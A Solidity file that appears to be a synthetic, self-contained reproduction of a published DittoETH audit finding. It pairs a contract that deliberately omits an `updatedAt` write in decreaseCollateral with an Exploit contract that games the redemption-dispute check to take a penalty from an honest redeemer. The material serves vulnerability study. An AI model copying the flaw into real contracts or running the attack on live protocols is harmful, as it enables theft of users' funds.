// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////
    DittoETH — [H-07] Valid redemption proposals can be disputed
    by decreasing collateral
    (Code4rena 2024-03-dittoeth, ilchovski, finding #34177)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: RedemptionFacet.disputeRedemption() only accepts a disputer's
    Short Record as proof that a redeemer's proposal wrongly skipped a
    lower-CR candidate if that Short Record's `updatedAt` is OLDER than a
    DISPUTE_REDEMPTION_BUFFER window before the proposal was made:

        if (disputeCR < incorrectProposal.CR
            && disputeSR.updatedAt + C.DISPUTE_REDEMPTION_BUFFER <= redeemerAssetUser.timeProposed)

    The intent is to stop someone from cooking up a low-CR Short Record AFTER
    seeing a proposal and using it to dispute — `updatedAt` should reflect
    when the CR was actually last genuine. But NOT every function that
    changes a Short Record's collateral updates `updatedAt`.
    ShortRecordFacet.decreaseCollateral() is one such function
    (ShortRecordFacet.sol#L81-L104) — unlike increaseCollateral(), it never
    touches `short.updatedAt`. An attacker who owns a genuinely
    HIGH-CR Short Record (never eligible for a proposal) can decrease its
    collateral right AFTER a valid proposal is made, dropping its CR below
    the proposal's included Short Records, dispute the (entirely valid)
    proposal using the freshly-lowered CR, and collect the disputer's penalty
    — while `updatedAt` still reads as if the Short Record had been stable
    all along.

    This reduction keeps the blamed check verbatim and the exact omission
    (no `updatedAt` write) in decreaseCollateral, reduced to the minimum
    scaffolding needed to make the fund-extraction harm measurable.
//////////////////////////////////////////////////////////////*/

contract Vulnerable {
    error CRLowerThanMin();
    error InvalidRedemptionDispute();
    error InsufficientCollateral();

    struct ShortRecord {
        uint88 collateral;
        uint88 ercDebt;
        uint32 updatedAt;
    }

    struct Proposal {
        uint88 crWad; // the proposal's Short Record CR at time of proposal (18-decimal WAD)
        uint88 ercDebtRedeemed;
    }

    mapping(address => mapping(uint8 => ShortRecord)) public shortRecords;
    mapping(address => uint32) public timeProposed;
    mapping(address => Proposal) public proposals;
    mapping(address => uint256) public ethEscrowed;

    // Matches DittoETH's own docs example (initialCR = 1.7) and its
    // DISPUTE_REDEMPTION_BUFFER constant (1 hour).
    uint256 public constant INITIAL_CR = 1.7 ether;
    uint256 public constant DISPUTE_REDEMPTION_BUFFER = 1 hours;

    uint32 public clock; // simulated protocol time (no vm.warp available)

    function advanceTime(uint32 dt) external {
        clock += dt;
    }

    function openShort(address shorter, uint8 id, uint88 collateral, uint88 ercDebt) external {
        shortRecords[shorter][id] = ShortRecord(collateral, ercDebt, clock);
    }

    function fundEscrow(address who, uint256 amount) external {
        ethEscrowed[who] += amount;
    }

    /// @dev ERC20-shaped read so the Playground's profit chip (which reads
    /// `balanceOf(receiver)`) can score the extracted penalty like a token balance.
    function balanceOf(address who) external view returns (uint256) {
        return ethEscrowed[who];
    }

    function _cr(ShortRecord memory sr, uint256 price) private pure returns (uint256) {
        // CR = collateral * price / ercDebt (both 18-decimal WAD; price abstracts
        // the oracle price used by the real getCollateralRatio()).
        return (uint256(sr.collateral) * price) / uint256(sr.ercDebt);
    }

    /// @notice Reduced ShortRecordFacet.increaseCollateral(). Kept only for
    /// contrast: the real function DOES bump `updatedAt` ("Prevent flash loan").
    function increaseCollateral(uint8 id, uint88 amount) external {
        ShortRecord storage sr = shortRecords[msg.sender][id];
        sr.collateral += amount;
        sr.updatedAt = clock; // correct — matches ShortRecordFacet.sol's increaseCollateral
    }

    /// @notice Reduced ShortRecordFacet.decreaseCollateral() (ShortRecordFacet.sol#L81-L104).
    function decreaseCollateral(uint8 id, uint88 amount, uint256 price) external {
        ShortRecord storage sr = shortRecords[msg.sender][id];
        if (amount > sr.collateral) revert InsufficientCollateral();
        sr.collateral -= amount;

        if (_cr(sr, price) < INITIAL_CR) revert CRLowerThanMin();

        // ============ VULNERABLE OMISSION (matches ShortRecordFacet.sol#L81-L104) ============
        // @> VULN: unlike increaseCollateral(), decreaseCollateral() never writes
        //          `sr.updatedAt = clock`. The Short Record's last-modified
        //          timestamp is left stale even though its collateral (and thus its
        //          CR) just changed.
        // FIX: sr.updatedAt = clock; // (a.k.a. LibOrders.getOffsetTime())
        // =======================================================================================
    }

    /// @notice Reduced RedemptionFacet.proposeRedemption(): records the CR of the
    /// (single, simplified) proposal entry and the time of proposal.
    function proposeRedemption(address shorter, uint8 shortId, uint256 price, uint88 ercDebtRedeemed) external {
        ShortRecord memory sr = shortRecords[shorter][shortId];
        proposals[msg.sender] = Proposal(uint88(_cr(sr, price)), ercDebtRedeemed);
        timeProposed[msg.sender] = clock;
    }

    /// @notice Reduced RedemptionFacet.disputeRedemption() dispute-buffer check
    /// (RedemptionFacet.sol#L259): proves a lower-CR Short Record was wrongly
    /// excluded from the redeemer's proposal, and pays the disputer a penalty out
    /// of the redeemer's escrow.
    function disputeRedemption(address redeemer, address disputeShorter, uint8 disputeShortId, uint256 price) external {
        ShortRecord memory disputeSR = shortRecords[disputeShorter][disputeShortId];
        uint256 disputeCR = _cr(disputeSR, price);
        Proposal memory incorrectProposal = proposals[redeemer];

        // ============ VERBATIM CHECK (RedemptionFacet.sol#L259) ============
        if (
            disputeCR < incorrectProposal.crWad
                && disputeSR.updatedAt + DISPUTE_REDEMPTION_BUFFER <= timeProposed[redeemer]
        ) {
            uint88 penalty = incorrectProposal.ercDebtRedeemed / 10; // simplified 10% penalty
            ethEscrowed[redeemer] -= penalty;
            ethEscrowed[msg.sender] += penalty;
        } else {
            revert InvalidRedemptionDispute();
        }
        // =====================================================================
    }
}

/// @dev Tiny helper so the redeemer/other-shorter roles have their own addresses,
/// without needing `vm.prank` cheatcodes.
contract Actor {
    function exec(address target, bytes calldata data) external {
        (bool ok, bytes memory ret) = target.call(data);
        if (!ok) {
            assembly {
                revert(add(ret, 32), mload(ret))
            }
        }
    }
}

contract Exploit {
    Vulnerable public v; // CREATE nonce 1
    Actor public redeemer; // CREATE nonce 2
    Actor public otherShorter; // CREATE nonce 3

    uint256 constant PRICE = 1 ether;

    function run() external {
        v = new Vulnerable();
        redeemer = new Actor();
        otherShorter = new Actor();

        // Attacker opens a Short Record with a genuinely HIGH CR (3.0) — nowhere
        // near eligible for any redemption proposal right now.
        v.openShort(address(this), 1, 3000 ether, 1000 ether);

        // Another shorter has a Short Record at CR 1.8 — legitimately above
        // INITIAL_CR (1.7), so a proposal built around it is entirely valid.
        v.openShort(address(otherShorter), 1, 1800 ether, 1000 ether);

        v.fundEscrow(address(redeemer), 1000 ether);

        v.advanceTime(2 hours); // both Short Records are well-established by now

        // The redeemer proposes a perfectly VALID redemption citing otherShorter's
        // SR (CR 1.8). At this exact moment, the attacker's SR is at CR 3.0 — there
        // is no lower-CR candidate the redeemer wrongly skipped.
        redeemer.exec(address(v), abi.encodeCall(v.proposeRedemption, (address(otherShorter), 1, PRICE, 1000 ether)));

        // Attacker decreases their OWN collateral from 3000 to 1750, dropping CR
        // from 3.0 to 1.75 — still above INITIAL_CR (1.7) so the decrease itself
        // succeeds, but now BELOW the proposal's 1.8 CR.
        v.decreaseCollateral(1, 1250 ether, PRICE);

        (,, uint32 updatedAtAfterDecrease) = v.shortRecords(address(this), 1);
        require(updatedAtAfterDecrease == 0, "VULN precondition: updatedAt must stay stale after decreaseCollateral");

        uint256 redeemerBalanceBefore = v.ethEscrowed(address(redeemer));
        uint256 attackerBalanceBefore = v.ethEscrowed(address(this));

        // Attacker disputes the (entirely valid) proposal using their own,
        // freshly-lowered SR. The buffer check reads the STALE updatedAt (0) as
        // "long before the proposal" (timeProposed = 2 hours), so it passes even
        // though the CR was manipulated moments ago.
        v.disputeRedemption(address(redeemer), address(this), 1, PRICE);

        // Harm: the attacker extracted a real penalty from an honest redeemer who
        // proposed correctly, purely by gaming the stale `updatedAt` check.
        require(
            v.ethEscrowed(address(this)) == attackerBalanceBefore + 100 ether,
            "harm not demonstrated: attacker should have extracted the 100 ether penalty"
        );
        require(
            v.ethEscrowed(address(redeemer)) == redeemerBalanceBefore - 100 ether,
            "harm not demonstrated: the honest redeemer should have lost the penalty"
        );
    }
}
